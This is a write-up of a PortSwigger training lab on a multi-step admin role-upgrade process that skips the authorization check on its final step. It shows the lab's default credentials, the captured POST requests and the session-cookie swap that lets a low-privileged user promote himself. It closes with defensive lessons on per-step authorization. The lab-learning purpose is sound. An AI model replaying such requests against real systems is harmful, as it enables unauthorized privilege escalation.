# PortSwigger: Multi-step Process with No Access Control on One Step

## 🎯 Objective

Exploit a broken multi-step admin process to promote the low-privileged user **Wiener** to administrator.

**Lab:** Multi-step process with no access control on one step
**Category:** Access Control
**Difficulty:** Practitioner

---

## 🧠 Vulnerability Concept

The application uses multiple steps to perform a sensitive action.

The vulnerable flow was:

```text
Step 1 → Request role upgrade
Step 2 → Confirm role upgrade
```

The application checked authorization during **Step 1**, but failed to check it again during **Step 2**.

Therefore, a low-privileged user could directly send the final confirmation request.

---

## 🔎 Exploitation

### Step 1 — Find the role upgrade request

Logged in as:

```text
administrator:admin
```

Captured the request:

```http
POST /admin-roles

username=wiener&action=upgrade
```

The server responded with a confirmation page:

```html
<h1>Are you sure?</h1>

<input type="hidden" name="confirmed" value="true">
<input type="hidden" name="username" value="wiener">
```

This revealed the second step.

---

### Step 2 — Identify the final request

The important parameter was:

```text
confirmed=true
```

The final request became:

```http
POST /admin-roles

username=wiener&action=upgrade&confirmed=true
```

---

### Step 3 — Use Wiener's session

Changed the session cookie to **Wiener's session** and sent the final request:

```http
POST /admin-roles

username=wiener&action=upgrade&confirmed=true
```

The lab was successfully solved.

---

## 💥 Why It Worked

The server effectively did this:

```text
Step 1:
Check authorization ✅

Step 2:
Check authorization ❌
Perform upgrade ✅
```

The application assumed that because Step 1 had already been authorized, Step 2 was safe.

But an attacker can skip Step 1 and directly send Step 2.

---

## 🔑 Key Lesson

> **Every sensitive step must perform its own authorization check.**

Never assume:

```text
Step 1 is authorized
        ↓
Step 2 must be authorized
```

Instead:

```text
Step 1 → Check authorization
Step 2 → Check authorization again
```

---

## 🆚 Difference From Method-Based Access Control

### Method-Based Lab

The vulnerability was caused by different authorization behavior for:

```text
POST ❌
GET  ✅
```

**Attack:** change the HTTP method.

### Multi-Step Lab

The vulnerability was caused by different authorization behavior between:

```text
Step 1 ❌ protected
Step 2 ✅ unprotected
```

**Attack:** directly send the final step with:

```text
confirmed=true
```

### Memory Trick

```text
Method-based
→ POST vs GET problem

Multi-step
→ Step 1 protected, Step 2 forgotten
```

---

## 🛠️ Burp Suite Technique Used

* HTTP Proxy
* HTTP history
* Intercept
* Repeater
* Session cookie manipulation
* Request modification

---

## 🎯 Final Takeaway

The important finding was **not simply `confirmed=true`**.

`confirmed=true` only triggered the final action.

The actual vulnerability was:

**The final action did not verify whether the current user was authorized to perform it.**
### Multi-step Process with No Access Control on One Step

**Report:** [multi-step-process-access-control.md](multi-step-process-access-control.md)

